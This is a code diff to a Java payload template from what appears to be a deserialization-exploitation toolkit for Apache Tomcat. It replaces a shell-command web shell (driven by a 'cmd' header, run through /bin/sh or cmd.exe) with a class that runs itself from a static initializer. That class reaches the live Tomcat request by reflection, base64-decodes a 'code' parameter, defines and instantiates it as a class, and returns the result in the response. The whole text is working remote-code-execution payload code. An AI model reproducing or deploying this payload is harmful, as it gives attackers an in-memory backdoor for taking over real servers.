@@ -1,23 +1,26 @@
 package com.h2tg.ysogate.template.tomcat;
 
-import java.io.InputStream;
 import java.io.Writer;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
-import java.util.Scanner;
 
-public class TomcatCmdExecTpl {
 
-    public TomcatCmdExecTpl() {
+public class CodeExec
+{
+
+    public CodeExec() {
         run();
     }
-
-    // 传参：需要执行的命令
-    private String getReqHeaderName() {
-        return "cmd";
+    static {
+        try {
+            new CodeExec();
+        } catch (Exception e) {
+        }
     }
-
+    private String getReqParamName() {
+        return "code";
+    }
 
     private void run() {
         try {
@@ -48,16 +51,13 @@ public class TomcatCmdExecTpl {
                             var3 = var4.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                         }
                     }
-
                     var3.setAccessible(true);
                     var4 = var3.get(var4);
-
                     try {
                         var3 = var4.getClass().getDeclaredField("global");
                     } catch (NoSuchFieldException var12) {
                         var3 = var4.getClass().getSuperclass().getDeclaredField("global");
                     }
-
                     var3.setAccessible(true);
                     var4 = var3.get(var4);
                     var4.getClass().getClassLoader().loadClass("org.apache.coyote.RequestGroupInfo");
@@ -65,53 +65,54 @@ public class TomcatCmdExecTpl {
                         var3 = var4.getClass().getDeclaredField("processors");
                         var3.setAccessible(true);
                         ArrayList var5 = (ArrayList) var3.get(var4);
-
                         for (int var6 = 0; var6 < var5.size(); ++var6) {
                             var3 = var5.get(var6).getClass().getDeclaredField("req");
                             var3.setAccessible(true);
                             var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var3.get(var5.get(var6)), 1);
-                            String var7;
+                            String var8;
                             try {
-                                var7 = (String) var3.get(var5.get(var6)).getClass().getMethod("getHeader", new Class[]{String.class}).invoke(var3.get(var5.get(var6)), new Object[]{getReqHeaderName()});
-                                if (var7 != null) {
-                                    Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4, new Object[0]);
+                                // 从 request body 获取参数
+                                var8 = (String) var4.getClass().getDeclaredMethod("getParameter", String.class).invoke(var4, getReqParamName());
+                                if (var8 != null) {
+                                    String var10 = exec(var8);
+                                    Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4);
                                     Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
-                                    writer.write(exec(var7));
+                                    writer.write(var10);
                                     writer.flush();
                                     writer.close();
                                     break;
                                 }
                             } catch (Exception ignored) {
                             }
-
                         }
                     }
                 }
             }
-        } catch (Throwable ignored) {
+        } catch (Throwable var16) {
         }
 
     }
 
-    // 执行模块
-    private  String exec(String cmd) {
+    private String exec(String var2) {
         try {
-            boolean isLinux = true;
-            String osType = System.getProperty("os.name");
-            if (osType != null && osType.toLowerCase().contains("win")) {
-                isLinux = false;
-            }
-
-            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
-            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-            Scanner s = new Scanner(in).useDelimiter("\\a");
-            String execRes = "";
-            while (s.hasNext()) {
-                execRes += s.next();
-            }
-            return execRes;
+            byte[] clazzByte = base64Decode(var2);
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
+            return clazz.newInstance().toString();
         } catch (Exception e) {
             return e.getMessage();
+        }
+    }
+
+    private byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception var4) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
         }
     }
 }
